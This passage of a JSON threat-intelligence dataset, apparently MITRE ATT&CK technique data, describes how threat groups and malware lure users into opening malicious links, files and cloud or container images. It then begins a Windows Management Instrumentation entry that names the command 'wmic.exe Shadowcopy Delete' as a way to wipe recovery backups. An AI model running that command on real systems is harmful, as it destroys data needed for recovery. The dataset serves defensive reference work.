"name": "FIN7", "description": "FIN7 has used malicious links to lure victims into downloading malware."}, {"id": "G0061", "name": "FIN8", "description": "FIN8 has used emails with malicious links to lure victims into installing malware."}, {"id": "G0047", "name": "Gamaredon Group", "description": "Gamaredon Group has attempted to get users to click on a link pointing to a malicious HTML file leading to follow-on malicious content."}, {"id": "S1138", "name": "Gootloader", "description": "Gootloader has been executed through malicious links presented to users as internet search results."}, {"id": "S0531", "name": "Grandoreiro", "description": "Grandoreiro has used malicious links to gain execution on victim machines."}, {"id": "S0561", "name": "GuLoader", "description": "GuLoader has relied upon users clicking on links to malicious documents."}, {"id": "S0499", "name": "Hancitor", "description": "Hancitor has relied upon users clicking on a malicious link delivered through phishing."}, {"id": "S0528", "name": "Javali", "description": "Javali has achieved execution through victims clicking links to malicious websites."}, {"id": "S0585", "name": "Kerrdown", "description": "Kerrdown has gained execution through victims opening malicious links."}, {"id": "G0094", "name": "Kimsuky", "description": "Kimsuky has lured victims into clicking malicious links."}, {"id": "S0669", "name": "KOCTOPUS", "description": "KOCTOPUS has relied on victims clicking on a malicious link delivered via email."}, {"id": "S1160", "name": "Latrodectus", "description": "Latrodectus has been executed through malicious links distributed in email campaigns."}, {"id": "G0140", "name": "LazyScripter", "description": "LazyScripter has relied upon users clicking on links to malicious files."}, {"id": "G0065", "name": "Leviathan", "description": "Leviathan has sent spearphishing email links attempting to get a user to click."}, {"id": "G1014", "name": "LuminousMoth", "description": "LuminousMoth has lured victims into clicking malicious Dropbox download links delivered through spearphishing."}, {"id": "G0095", "name": "Machete", "description": "Machete has has relied on users opening malicious links delivered through spearphishing to execute malware."}, {"id": "G0059", "name": "Magic Hound", "description": "Magic Hound has attempted to lure victims into opening malicious links embedded in emails."}, {"id": "S0530", "name": "Melcoz", "description": "Melcoz has gained execution through victims opening malicious links."}, {"id": "G0103", "name": "Mofang", "description": "Mofang's spearphishing emails required a user to click the link to connect to a compromised website."}, {"id": "G0021", "name": "Molerats", "description": "Molerats has sent malicious links via email trick users into opening a RAR archive and running an executable."}, {"id": "G0069", "name": "MuddyWater", "description": "MuddyWater has distributed URLs in phishing e-mails that link to lure documents."}, {"id": "G0129", "name": "Mustang Panda", "description": "Mustang Panda has sent malicious links including links directing victims to a Google Drive folder."}, {"id": "G1020", "name": "Mustard Tempest", "description": "Mustard Tempest has lured users into downloading malware through malicious links in fake advertisements and spearphishing emails."}, {"id": "S0198", "name": "NETWIRE", "description": "NETWIRE has been executed through convincing victims into clicking malicious links."}, {"id": "C0002", "name": "Night Dragon", "description": "During Night Dragon, threat actors enticed users to click on links in spearphishing emails to download malware."}, {"id": "S0644", "name": "ObliqueRAT", "description": "ObliqueRAT has gained execution on targeted systems through luring users to click on links to malicious URLs."}, {"id": "G0049", "name": "OilRig", "description": "OilRig has delivered malicious links to achieve execution on the target system."}, {"id": "C0022", "name": "Operation Dream Job", "description": "During Operation Dream Job, Lazarus Group lured users into executing a malicious link to disclose private account information or provide initial access."}, {"id": "C0016", "name": "Operation Dust Storm", "description": "During Operation Dust Storm, the threat actors relied on a victim clicking on a malicious link sent via email."}, {"id": "C0005", "name": "Operation Spalax", "description": "During Operation Spalax, the threat actors relied on a victim to click on a malicious link distributed via phishing emails."}, {"id": "S1017", "name": "OutSteel", "description": "OutSteel has relied on a user to click a malicious link within a spearphishing email."}, {"id": "G0040", "name": "Patchwork", "description": "Patchwork has used spearphishing with links to try to get users to click, download and open malicious files."}, {"id": "S0435", "name": "PLEAD", "description": "PLEAD has been executed via malicious links in e-mails."}, {"id": "S0453", "name": "Pony", "description": "Pony has attempted to lure targets into clicking links in spoofed emails from legitimate banks."}, {"id": "S0650", "name": "QakBot", "description": "QakBot has gained execution through users opening malicious links."}, {"id": "G1039", "name": "RedCurl", "description": "RedCurl has used malicious links to infect the victim machines."}, {"id": "G1031", "name": "Saint Bear", "description": "Saint Bear has, in addition to email-based phishing attachments, used malicious websites masquerading as legitimate entities to host links to malicious files for user execution."}, {"id": "S1018", "name": "Saint Bot", "description": "Saint Bot has relied on users to click on a malicious link delivered via a spearphishing."}, {"id": "G0034", "name": "Sandworm Team", "description": "Sandworm Team has tricked unwitting recipients into clicking on malicious hyperlinks within emails crafted to resemble trustworthy senders."}, {"id": "G0121", "name": "Sidewinder", "description": "Sidewinder has lured targets to click on malicious links to gain execution in the target environment."}, {"id": "S0649", "name": "SMOKEDHAM", "description": "SMOKEDHAM has relied upon users clicking on a malicious link delivered through phishing."}, {"id": "S1086", "name": "Snip3", "description": "Snip3 has been executed through luring victims into clicking malicious links."}, {"id": "S1124", "name": "SocGholish", "description": "SocGholish has lured victims into interacting with malicious links on compromised websites for execution."}, {"id": "S0646", "name": "SpicyOmelette", "description": "SpicyOmelette has been executed through malicious links within spearphishing emails."}, {"id": "S1030", "name": "Squirrelwaffle", "description": "Squirrelwaffle has relied on victims to click on a malicious link send via phishing campaigns."}, {"id": "G1018", "name": "TA2541", "description": "TA2541 has used malicious links to cloud and web services to gain execution on victim machines."}, {"id": "G0092", "name": "TA505", "description": "TA505 has used lures to get users to click links in emails and attachments. For example, TA505 makes their malware look like legitimate Microsoft Word documents, .pdf and/or .lnk files. "}, {"id": "G1037", "name": "TA577", "description": "TA577 has lured users into executing malicious JavaScript files by sending malicious links via email."}, {"id": "G1038", "name": "TA578", "description": "TA578 has placed malicious links in contact forms on victim sites, often spoofing a copyright complaint, to redirect users to malicious file downloads."}, {"id": "G0134", "name": "Transparent Tribe", "description": "Transparent Tribe has directed users to open URLs hosting malicious content."}, {"id": "S0436", "name": "TSCookie", "description": "TSCookie has been executed via malicious links embedded in e-mails spoofing the Ministries of Education, Culture, Sports, Science and Technology of Japan."}, {"id": "G0010", "name": "Turla", "description": "Turla has used spearphishing via a link to get users to download and run their malware."}, {"id": "C0037", "name": "Water Curupira Pikabot Distribution", "description": "Water Curupira Pikabot Distribution distributed a PDF attachment containing a malicious link to a Pikabot installer."}, {"id": "G0112", "name": "Windshift", "description": "Windshift has used links embedded in e-mails to lure victims into executing malicious code."}, {"id": "G1035", "name": "Winter Vivern", "description": "Winter Vivern has mimicked legitimate government-related domains to deliver malicious webpages containing links to documents or other content for user execution."}, {"id": "G0102", "name": "Wizard Spider", "description": "Wizard Spider has lured victims into clicking a malicious link delivered through spearphishing."}, {"id": "G0128", "name": "ZIRCONIUM", "description": "ZIRCONIUM has used malicious links in e-mails to lure victims into downloading malware."}]}, {"name": "Malicious File", "description": "An adversary may rely upon a user opening a malicious file in order to gain execution. Users may be subjected to social engineering to get them to open a file that will lead to code execution. This user action will typically be observed as follow-on behavior from Spearphishing Attachment. Adversaries may use several types of files that require a user to execute them, including .doc, .pdf, .xls, .rtf, .scr, .exe, .lnk, .pif, .cpl, and .reg.", "detailed_description": "An adversary may rely upon a user opening a malicious file in order to gain execution. Users may be subjected to social engineering to get them to open a file that will lead to code execution. This user action will typically be observed as follow-on behavior from Spearphishing Attachment. Adversaries may use several types of files that require a user to execute them, including .doc, .pdf, .xls, .rtf, .scr, .exe, .lnk, .pif, .cpl, and .reg.\nAdversaries may employ various forms of Masquerading and Obfuscated Files or Information to increase the likelihood that a user will open and successfully execute a malicious file. These methods may include using a familiar naming convention and/or password protecting the file and supplying instructions to a user on how to open it.\nWhile Malicious File frequently occurs shortly after Initial Access it may occur at other phases of an intrusion, such as when an adversary places a file in a shared directory or on a user's desktop hoping that a user will click on it. This activity may also be seen shortly after Internal Spearphishing.", "id": "T1204.002", "examples": [{"id": "C0028", "name": "2015 Ukraine Electric Power Attack", "description": "During the 2015 Ukraine Electric Power Attack, Sandworm Team leveraged Microsoft Office attachments which contained malicious macros that were automatically executed once the user permitted them. "}, {"id": "G0018", "name": "admin@338", "description": "admin@338 has attempted to get victims to launch malicious Microsoft Word attachments delivered via spearphishing emails."}, {"id": "S0331", "name": "Agent Tesla", "description": "Agent Tesla has been executed through malicious e-mail attachments "}, {"id": "G0130", "name": "Ajax Security Team", "description": "Ajax Security Team has lured victims into executing malicious files."}, {"id": "G0138", "name": "Andariel", "description": "Andariel has attempted to lure victims into enabling malicious macros within email attachments."}, {"id": "G1007", "name": "Aoqin Dragon", "description": "Aoqin Dragon has lured victims into opening weaponized documents, fake external drives, and fake antivirus to execute malicious payloads."}, {"id": "S0584", "name": "AppleJeus", "description": "AppleJeus has required user execution of a malicious MSI installer."}, {"id": "S0622", "name": "AppleSeed", "description": "AppleSeed can achieve execution through users running malicious file attachments distributed via email."}, {"id": "G0099", "name": "APT-C-36", "description": "APT-C-36 has prompted victims to accept macros in order to execute the subsequent payload."}, {"id": "G0005", "name": "APT12", "description": "APT12 has attempted to get victims to open malicious Microsoft Word and PDF attachment sent via spearphishing."}, {"id": "G0073", "name": "APT19", "description": "APT19 attempted to get users to launch malicious attachments delivered via spearphishing emails."}, {"id": "G0007", "name": "APT28", "description": "APT28 attempted to get users to click on Microsoft Office attachments containing malicious macro scripts."}, {"id": "G0016", "name": "APT29", "description": "APT29 has used various forms of spearphishing attempting to get a user to open attachments, including, but not limited to, malicious Microsoft Word documents, .pdf, and .lnk files. "}, {"id": "G0013", "name": "APT30", "description": "APT30 has relied on users to execute malicious file attachments delivered via spearphishing emails."}, {"id": "G0050", "name": "APT32", "description": "APT32 has attempted to lure users to execute a malicious dropper delivered via a spearphishing attachment."}, {"id": "G0064", "name": "APT33", "description": "APT33 has used malicious e-mail attachments to lure victims into executing malware."}, {"id": "G0067", "name": "APT37", "description": "APT37 has sent spearphishing attachments attempting to get a user to open them."}, {"id": "G0082", "name": "APT38", "description": "APT38  has attempted to lure victims into enabling malicious macros within email attachments."}, {"id": "G0087", "name": "APT39", "description": "APT39 has sent spearphishing emails in an attempt to lure users to click on a malicious attachment."}, {"id": "S0373", "name": "Astaroth", "description": "Astaroth has used malicious files including VBS, LNK, and HTML for execution."}, {"id": "S0606", "name": "Bad Rabbit", "description": "Bad Rabbit has been executed through user installation of an executable disguised as a flash installer."}, {"id": "S0642", "name": "BADFLICK", "description": "BADFLICK has relied upon users clicking on a malicious attachment delivered through spearphishing."}, {"id": "S0234", "name": "Bandook", "description": "Bandook has used lure documents to convince the user to enable macros."}, {"id": "S0268", "name": "Bisonal", "description": "Bisonal has relied on users to execute malicious file attachments delivered via spearphishing emails."}, {"id": "G1002", "name": "BITTER", "description": "BITTER has attempted to lure victims into opening malicious attachments delivered via spearphishing."}, {"id": "S1070", "name": "Black Basta", "description": "Black Basta has been downloaded and executed from malicious Excel files."}, {"id": "G0098", "name": "BlackTech", "description": "BlackTech has used e-mails with malicious documents to lure victims into installing malware."}, {"id": "S0520", "name": "BLINDINGCAN", "description": "BLINDINGCAN has lured victims into executing malicious macros embedded within Microsoft Office documents."}, {"id": "S0635", "name": "BoomBox", "description": "BoomBox has gained execution through user interaction with a malicious file."}, {"id": "G0060", "name": "BRONZE BUTLER", "description": "BRONZE BUTLER has attempted to get users to launch malicious Microsoft Word attachments delivered via spearphishing emails."}, {"id": "S1063", "name": "Brute Ratel C4", "description": "Brute Ratel C4 has gained execution through users opening malicious documents."}, {"id": "S1039", "name": "Bumblebee", "description": "Bumblebee has relied upon a user opening an ISO file to enable execution of malicious shortcut files and DLLs."}, {"id": "S0482", "name": "Bundlore", "description": "Bundlore has attempted to get users to execute a malicious .app file that looks like a Flash Player update."}, {"id": "C0011", "name": "C0011", "description": "During C0011, Transparent Tribe relied on a student target to open a malicious document delivered via email."}, {"id": "C0015", "name": "C0015", "description": "During C0015, the threat actors relied on users to enable macros within a malicious Microsoft Word document."}, {"id": "S0348", "name": "Cardinal RAT", "description": "Cardinal RAT lures victims into executing malicious macros embedded within Microsoft Excel documents."}, {"id": "S0465", "name": "CARROTBALL", "description": "CARROTBALL has been executed through users being lured into opening malicious e-mail attachments."}, {"id": "S0631", "name": "Chaes", "description": "Chaes requires the user to click on the malicious Word document to execute the next part of the attack."}, {"id": "S0660", "name": "Clambling", "description": "Clambling has gained execution through luring victims into opening malicious files."}, {"id": "G0080", "name": "Cobalt Group", "description": "Cobalt Group has sent emails containing malicious attachments that require users to execute a file or macro to infect the victim machine."}, {"id": "G0142", "name": "Confucius", "description": "Confucius has lured victims to execute malicious attachments included in crafted spearphishing emails related to current topics."}, {"id": "S0527", "name": "CSPY Downloader", "description": "CSPY Downloader has been delivered via malicious documents with embedded macros."}, {"id": "G1012", "name": "CURIUM", "description": "CURIUM has lured users into opening malicious files delivered via social media."}, {"id": "S1014", "name": "DanBot", "description": "DanBot has relied on victims' opening a malicious file for initial execution."}, {"id": "G0070", "name": "Dark Caracal", "description": "Dark Caracal makes their malware look like Flash Player, Office, or PDF documents in order to entice a user to click on it."}, {"id": "S1111", "name": "DarkGate", "description": "DarkGate initial infection payloads can masquerade as pirated media content requiring user interaction for code execution. DarkGate is distributed through phishing links to VBS or MSI objects requiring user interaction for execution."}, {"id": "G0012", "name": "Darkhotel", "description": "Darkhotel has sent spearphishing emails in an attempt to lure users into clicking on a malicious attachments."}, {"id": "G0079", "name": "DarkHydrus", "description": "DarkHydrus has sent malware that required users to hit the enable button in Microsoft Excel to allow an .iqy file to be downloaded."}, {"id": "S1066", "name": "DarkTortilla", "description": "DarkTortilla has relied on a user to open a malicious document or archived file delivered via email for initial execution."}, {"id": "S1088", "name": "Disco", "description": "Disco has been executed through inducing user interaction with malicious .zip and .msi files."}, {"id": "S1021", "name": "DnsSystem", "description": "DnsSystem has lured victims into opening macro-enabled Word documents for execution."}, {"id": "G0035", "name": "Dragonfly", "description": "Dragonfly has used various forms of spearphishing in attempts to get users to open malicious attachments."}, {"id": "S0384", "name": "Dridex", "description": "Dridex has relied upon users clicking on a malicious attachment delivered through spearphishing."}, {"id": "G1006", "name": "Earth Lusca", "description": "Earth Lusca required users to click on a malicious file for the loader to activate."}, {"id": "G0066", "name": "Elderwood", "description": "Elderwood has leveraged multiple types of spearphishing in order to attempt to get a user to open attachments."}, {"id": "S0367", "name": "Emotet", "description": "Emotet has relied upon users clicking on a malicious attachment delivered through spearphishing."}, {"id": "S0634", "name": "EnvyScout", "description": "EnvyScout has been executed through malicious files attached to e-mails."}, {"id": "G1011", "name": "EXOTIC LILY", "description": "EXOTIC LILY has gained execution through victims clicking on malicious LNK files contained within ISO files, which can execute hidden DLLs within the ISO."}, {"id": "G0137", "name": "Ferocious Kitten", "description": "Ferocious Kitten has attempted to convince victims to enable malicious content within a spearphishing email by including an odd decoy message."}, {"id": "G0085", "name": "FIN4", "description": "FIN4 has lured victims to launch malicious attachments delivered via spearphishing emails (often sent from compromised accounts)."}, {"id": "G0037", "name": "FIN6", "description": "FIN6 has used malicious documents to lure victims into allowing execution of PowerShell scripts."}, {"id": "G0046", "name": "FIN7", "description": "FIN7 lured victims to double-click on images in the attachments they sent which would then execute the hidden LNK file."}, {"id": "G0061", "name": "FIN8", "description": "FIN8 has used malicious e-mail attachments to lure victims into executing malware."}, {"id": "S0696", "name": "Flagpro", "description": "Flagpro has relied on users clicking a malicious attachment delivered through spearphishing."}, {"id": "C0001", "name": "Frankenstein", "description": "During Frankenstein, the threat actors relied on a victim to enable macros within a malicious Microsoft Word document likely sent via email."}, {"id": "G0084", "name": "Gallmaker", "description": "Gallmaker sent victims a lure document with a warning that asked victims to \"enable content\" for execution."}, {"id": "G0047", "name": "Gamaredon Group", "description": "Gamaredon Group has attempted to get users to click on Office attachments with malicious macros embedded."}, {"id": "G0078", "name": "Gorgon Group", "description": "Gorgon Group attempted to get users to launch malicious Microsoft Office attachments delivered via spearphishing emails."}, {"id": "S0531", "name": "Grandoreiro", "description": "Grandoreiro has infected victims via malicious attachments."}, {"id": "S0561", "name": "GuLoader", "description": "The GuLoader executable has been retrieved via embedded macros in malicious Word documents."}, {"id": "S0499", "name": "Hancitor", "description": "Hancitor has used malicious Microsoft Word documents, sent via email, which prompted the victim to enable macros."}, {"id": "G1001", "name": "HEXANE", "description": "HEXANE has relied on victim's executing malicious file attachments delivered via email or embedded within actor-controlled websites to deliver malware."}, {"id": "S1027", "name": "Heyoka Backdoor", "description": "Heyoka Backdoor has been spread through malicious document lures."}, {"id": "G0126", "name": "Higaisa", "description": "Higaisa used malicious e-mail attachments to lure victims into executing LNK files."}, {"id": "S0483", "name": "IcedID", "description": "IcedID has been executed through Word and Excel files with malicious embedded macros and through ISO and LNK files that execute the malicious DLL."}, {"id": "G0100", "name": "Inception", "description": "Inception lured victims into clicking malicious files for machine reconnaissance and to execute malware."}, {"id": "G0136", "name": "IndigoZebra", "description": "IndigoZebra sent spearphishing emails containing malicious attachments that urged recipients to review modifications in the file which would trigger the attack."}, {"id": "G0119", "name": "Indrik Spider", "description": "Indrik Spider has attempted to get users to click on a malicious zipped file."}, {"id": "S0260", "name": "InvisiMole", "description": "InvisiMole can deliver trojanized versions of software and documents, relying on user execution."}, {"id": "S0528", "name": "Javali", "description": "Javali has achieved execution through victims opening malicious attachments, including MSI files with embedded VBScript."}, {"id": "S0389", "name": "JCry", "description": "JCry has achieved execution by luring users to click on a file that appeared to be an Adobe Flash Player update installer. "}, {"id": "S0648", "name": "JSS Loader", "description": "JSS Loader has been executed through malicious attachments contained in spearphishing emails."}, {"id": "S0585", "name": "Kerrdown", "description": "Kerrdown has gained execution through victims opening malicious files."}, {"id": "S0526", "name": "KGH_SPY", "description": "KGH_SPY has been spread through Word documents containing malicious macros."}, {"id": "G0094", "name": "Kimsuky", "description": "Kimsuky has used attempted to lure victims into opening malicious e-mail attachments."}, {"id": "S0669", "name": "KOCTOPUS", "description": "KOCTOPUS has relied on victims clicking a malicious document for execution."}, {"id": "S0356", "name": "KONNI", "description": "KONNI has relied on a victim to enable malicious macros within an attachment delivered via email."}, {"id": "S1075", "name": "KOPILUWAK", "description": "KOPILUWAK has gained execution through malicious attachments."}, {"id": "S1160", "name": "Latrodectus", "description": "Latrodectus has lured users into opening malicious email attachments for execution."}, {"id": "G0032", "name": "Lazarus Group", "description": "Lazarus Group has attempted to get users to launch a malicious Microsoft Word attachment delivered via a spearphishing email."}, {"id": "G0140", "name": "LazyScripter", "description": "LazyScripter has lured users to open malicious email attachments."}, {"id": "G0065", "name": "Leviathan", "description": "Leviathan has sent spearphishing attachments attempting to get a user to click."}, {"id": "S0447", "name": "Lokibot", "description": "Lokibot has tricked recipients into enabling malicious macros by getting victims to click \"enable content\" in email attachments."}, {"id": "S1142", "name": "LunarMail", "description": "LunarMail has been installed through a malicious macro in a Microsoft Word document."}, {"id": "G0095", "name": "Machete", "description": "Machete has relied on users opening malicious attachments delivered through spearphishing to execute malware."}, {"id": "G0059", "name": "Magic Hound", "description": "Magic Hound has attempted to lure victims into opening malicious email attachments."}, {"id": "G1026", "name": "Malteiro", "description": "Malteiro has relied on users to execute .zip file attachments containing malicious URLs."}, {"id": "G0045", "name": "menuPass", "description": "menuPass has attempted to get victims to open malicious files such as Windows Shortcuts (.lnk) and/or Microsoft Office documents, sent via email as part of spearphishing campaigns."}, {"id": "S0455", "name": "Metamorfo", "description": "Metamorfo requires the user to double-click the executable to run the malicious HTA file or to download a malicious installer."}, {"id": "S1122", "name": "Mispadu", "description": "Mispadu has relied on users to execute malicious files in order to gain execution on victim machines."}, {"id": "G0103", "name": "Mofang", "description": "Mofang's malicious spearphishing attachments required a user to open the file after receiving."}, {"id": "G0021", "name": "Molerats", "description": "Molerats has sent malicious files via email that tricked users into clicking Enable Content to run an embedded macro and to download malicious archives."}, {"id": "S1026", "name": "Mongall", "description": "Mongall has relied on a user opening a malicious document for execution."}, {"id": "G1036", "name": "Moonstone Sleet", "description": "Moonstone Sleet relied on users interacting with malicious files, such as a trojanized PuTTY installer, for initial execution."}, {"id": "G0069", "name": "MuddyWater", "description": "MuddyWater has attempted to get users to open malicious PDF attachment and to enable macros and launch malicious Microsoft Word documents delivered via spearphishing emails."}, {"id": "G0129", "name": "Mustang Panda", "description": "Mustang Panda has sent malicious files requiring direct victim interaction to execute."}, {"id": "G0019", "name": "Naikon", "description": "Naikon has convinced victims to open malicious attachments to execute malware."}, {"id": "S0637", "name": "NativeZone", "description": "NativeZone can display an RTF document to the user  to enable execution of  Cobalt Strike stage shellcode."}, {"id": "S0198", "name": "NETWIRE", "description": "NETWIRE has been executed through luring victims into opening malicious documents."}, {"id": "S1100", "name": "Ninja", "description": "Ninja has gained execution through victims opening malicious executable files embedded in zip archives."}, {"id": "G0133", "name": "Nomadic Octopus", "description": "Nomadic Octopus as attempted to lure victims into clicking on malicious attachments within spearphishing emails."}, {"id": "S0340", "name": "Octopus", "description": "Octopus has relied upon users clicking on a malicious attachment delivered through spearphishing."}, {"id": "G0049", "name": "OilRig", "description": "OilRig has delivered macro-enabled documents that required targets to click the \"enable content\" button to execute the payload on the system."}, {"id": "C0022", "name": "Operation Dream Job", "description": "During Operation Dream Job, Lazarus Group lured victims into executing malicious documents that contained \"dream job\" descriptions from defense, aerospace, and other sectors."}, {"id": "C0016", "name": "Operation Dust Storm", "description": "During Operation Dust Storm, the threat actors relied on potential victims to open a malicious Microsoft Word document sent via email."}, {"id": "C0006", "name": "Operation Honeybee", "description": "During Operation Honeybee, threat actors relied on a victim to enable macros within a malicious Word document."}, {"id": "C0013", "name": "Operation Sharpshooter", "description": "During Operation Sharpshooter, the threat actors relied on victims executing malicious Microsoft Word or PDF files."}, {"id": "C0005", "name": "Operation Spalax", "description": "During Operation Spalax, the threat actors relied on a victim to open a PDF document and click on an embedded malicious link to download malware."}, {"id": "S0402", "name": "OSX/Shlayer", "description": "OSX/Shlayer has relied on users mounting and executing a malicious DMG file."}, {"id": "S1017", "name": "OutSteel", "description": "OutSteel has relied on a user to execute a malicious attachment delivered via spearphishing."}, {"id": "G0040", "name": "Patchwork", "description": "Patchwork embedded a malicious macro in a Word document and lured the victim to click on an icon to execute the malware."}, {"id": "G0068", "name": "PLATINUM", "description": "PLATINUM has attempted to get users to open malicious files by sending spearphishing emails with attachments to victims."}, {"id": "S0435", "name": "PLEAD", "description": "PLEAD has been executed via malicious e-mail attachments."}, {"id": "S0428", "name": "PoetRAT", "description": "PoetRAT has used spearphishing attachments to infect victims."}, {"id": "S0453", "name": "Pony", "description": "Pony has attempted to lure targets into downloading an attached executable (ZIP, RAR, or CAB archives) or document (PDF or other MS Office format)."}, {"id": "G0056", "name": "PROMETHIUM", "description": "PROMETHIUM has attempted to get users to execute compromised installation files for legitimate software including compression applications, security software, browsers, file recovery applications, and other tools and utilities."}, {"id": "S0650", "name": "QakBot", "description": "QakBot has gained execution through users opening malicious attachments."}, {"id": "S0458", "name": "Ramsay", "description": "Ramsay has been executed through malicious e-mail attachments."}, {"id": "G0075", "name": "Rancor", "description": "Rancor attempted to get users to click on an embedded macro within a Microsoft Office Excel document to launch their malware."}, {"id": "G1039", "name": "RedCurl", "description": "RedCurl has used malicious files to infect the victim machines."}, {"id": "S0496", "name": "REvil", "description": "REvil has been executed via malicious MS Word e-mail attachments."}, {"id": "S0433", "name": "Rifdoor", "description": "Rifdoor has been executed from malicious Excel or Word documents containing macros."}, {"id": "S0240", "name": "ROKRAT", "description": "ROKRAT has relied upon users clicking on a malicious attachment delivered through spearphishing."}, {"id": "S0148", "name": "RTM", "description": "RTM has relied on users opening malicious email attachments, decompressing the attached archive, and double-clicking the executable within."}, {"id": "G0048", "name": "RTM", "description": "RTM has attempted to lure victims into opening e-mail attachments to execute malicious code."}, {"id": "G1031", "name": "Saint Bear", "description": "Saint Bear relies on user interaction and execution of malicious attachments and similar for initial execution on victim systems."}, {"id": "S1018", "name": "Saint Bot", "description": "Saint Bot has relied on users to execute a malicious attachment delivered via spearphishing."}, {"id": "G0034", "name": "Sandworm Team", "description": "Sandworm Team has tricked unwitting recipients into clicking on spearphishing attachments and enabling malicious macros embedded within files."}, {"id": "G1008", "name": "SideCopy", "description": "SideCopy has attempted to lure victims into clicking on malicious embedded archive files sent via spearphishing campaigns."}, {"id": "G0121", "name": "Sidewinder", "description": "Sidewinder has lured targets to click on malicious files to gain execution in the target environment."}, {"id": "G0091", "name": "Silence", "description": "Silence attempts to get users to launch malicious attachments delivered via spearphishing emails."}, {"id": "S1086", "name": "Snip3", "description": "Snip3 can gain execution through the download of visual basic files."}, {"id": "S0390", "name": "SQLRat", "description": "SQLRat relies on users clicking on an embedded image to execute the scripts."}, {"id": "S1030", "name": "Squirrelwaffle", "description": "Squirrelwaffle has relied on users enabling malicious macros within Microsoft Excel and Word attachments."}, {"id": "G1033", "name": "Star Blizzard", "description": "Star Blizzard has lured targets into opening malicious .pdf files to deliver malware."}, {"id": "S1037", "name": "STARWHALE", "description": "STARWHALE has relied on victims opening a malicious Excel file for execution."}, {"id": "S0491", "name": "StrongPity", "description": "StrongPity has been executed via compromised installation files for legitimate software including compression applications, security software, browsers, file recovery applications, and other tools and utilities."}, {"id": "S1042", "name": "SUGARDUMP", "description": "Some SUGARDUMP variants required a user to enable a macro within a malicious .xls file for execution."}, {"id": "S1064", "name": "SVCReady", "description": "SVCReady has relied on users clicking a malicious attachment delivered through spearphishing."}, {"id": "S0464", "name": "SYSCON", "description": "SYSCON has been executed by luring victims to open malicious e-mail attachments."}, {"id": "G1018", "name": "TA2541", "description": "TA2541 has used macro-enabled MS Word documents to lure victims into executing malicious payloads."}, {"id": "G0062", "name": "TA459", "description": "TA459 has attempted to get victims to open malicious Microsoft Word attachment sent via spearphishing."}, {"id": "G0092", "name": "TA505", "description": "TA505 has used lures to get users to enable content in malicious attachments and execute malicious files contained in archives. For example, TA505 makes their malware look like legitimate Microsoft Word documents, .pdf and/or .lnk files. "}, {"id": "G0127", "name": "TA551", "description": "TA551 has prompted users to enable macros within spearphishing attachments to install malware."}, {"id": "S0011", "name": "Taidoor", "description": "Taidoor has relied upon a victim to click on a malicious email attachment."}, {"id": "G0089", "name": "The White Company", "description": "The White Company has used phishing lure documents that trick users into opening them and infecting their computers."}, {"id": "G0027", "name": "Threat Group-3390", "description": "Threat Group-3390 has lured victims into opening malicious files containing malware."}, {"id": "S0665", "name": "ThreatNeedle", "description": "ThreatNeedle relies on a victim to click on a malicious document for initial execution."}, {"id": "G0131", "name": "Tonto Team", "description": "Tonto Team has relied on user interaction to open their malicious RTF documents."}, {"id": "G0134", "name": "Transparent Tribe", "description": "Transparent Tribe has used weaponized documents in e-mail to compromise targeted systems."}, {"id": "S0266", "name": "TrickBot", "description": "TrickBot has attempted to get users to launch malicious documents to deliver its payload. "}, {"id": "G0081", "name": "Tropic Trooper", "description": "Tropic Trooper has lured victims into executing malware via malicious e-mail attachments."}, {"id": "S0263", "name": "TYPEFRAME", "description": "A Word document delivering TYPEFRAME prompts the user to enable macro execution."}, {"id": "S0476", "name": "Valak", "description": "Valak has been executed via Microsoft Word documents containing malicious macros."}, {"id": "S0670", "name": "WarzoneRAT", "description": "WarzoneRAT has relied on a victim to open a malicious attachment within an email for execution."}, {"id": "C0037", "name": "Water Curupira Pikabot Distribution", "description": "Water Curupira Pikabot Distribution delivered Pikabot installers as password-protected ZIP files containing heavily obfuscated JavaScript, or IMG files containing an LNK mimicking a Word document and a malicious DLL."}, {"id": "G0107", "name": "Whitefly", "description": "Whitefly has used malicious .exe or .dll files disguised as documents or images."}, {"id": "G0112", "name": "Windshift", "description": "Windshift has used e-mail attachments to lure victims into executing malicious code."}, {"id": "G0090", "name": "WIRTE", "description": "WIRTE has attempted to lure users into opening malicious MS Word and Excel files to execute malicious payloads."}, {"id": "G0102", "name": "Wizard Spider", "description": "Wizard Spider has lured victims to execute malware with spearphishing attachments containing macros to download either Emotet, Bokbot, TrickBot, or Bazar."}, {"id": "S1065", "name": "Woody RAT", "description": "Woody RAT has relied on users opening a malicious email attachment for execution."}, {"id": "S1013", "name": "ZxxZ", "description": "ZxxZ has relied on victims to open a malicious attachment delivered via email."}]}, {"name": "Malicious Image", "description": "Adversaries may rely on a user running a malicious image to facilitate execution. Amazon Web Services (AWS) Amazon Machine Images (AMIs), Google Cloud Platform (GCP) Images, and Azure Images as well as popular container runtimes such as Docker can be backdoored. Backdoored images may be uploaded to a public repository via Upload Malware, and users may then download and deploy an instance or container from the image without realizing the image is malicious, thus bypassing techniques that specifically achieve Initial Access. This can lead to the execution of malicious code, such as code that executes cryptocurrency mining, in the instance or container.", "detailed_description": "Adversaries may rely on a user running a malicious image to facilitate execution. Amazon Web Services (AWS) Amazon Machine Images (AMIs), Google Cloud Platform (GCP) Images, and Azure Images as well as popular container runtimes such as Docker can be backdoored. Backdoored images may be uploaded to a public repository via Upload Malware, and users may then download and deploy an instance or container from the image without realizing the image is malicious, thus bypassing techniques that specifically achieve Initial Access. This can lead to the execution of malicious code, such as code that executes cryptocurrency mining, in the instance or container.\nAdversaries may also name images a certain way to increase the chance of users mistakenly deploying an instance or container from the image (ex: Match Legitimate Name or Location).", "id": "T1204.003", "examples": [{"id": "G0139", "name": "TeamTNT", "description": "TeamTNT has relied on users to download and execute malicious Docker images."}]}]}, {"name": "Windows Management Instrumentation", "description": "Adversaries may abuse Windows Management Instrumentation (WMI) to execute malicious commands and payloads. WMI is designed for programmers and is the infrastructure for management data and operations on Windows systems. WMI is an administration feature that provides a uniform environment to access Windows system components.", "detailed_description": "Adversaries may abuse Windows Management Instrumentation (WMI) to execute malicious commands and payloads. WMI is designed for programmers and is the infrastructure for management data and operations on Windows systems. WMI is an administration feature that provides a uniform environment to access Windows system components.\nThe WMI service enables both local and remote access, though the latter is facilitated by Remote Services such as Distributed Component Object Model and Windows Remote Management. Remote WMI over DCOM operates using port 135, whereas WMI over WinRM operates over port 5985 when using HTTP and 5986 for HTTPS.\nAn adversary can use WMI to interact with local and remote systems and use it as a means to execute various behaviors, such as gathering information for Discovery as well as Execution of commands and payloads. For example, wmic.exe can be abused by an adversary to delete shadow copies with the command wmic.exe Shadowcopy Delete (i.e., Inhibit System Recovery).\nNote: wmic.exe is deprecated as of January of 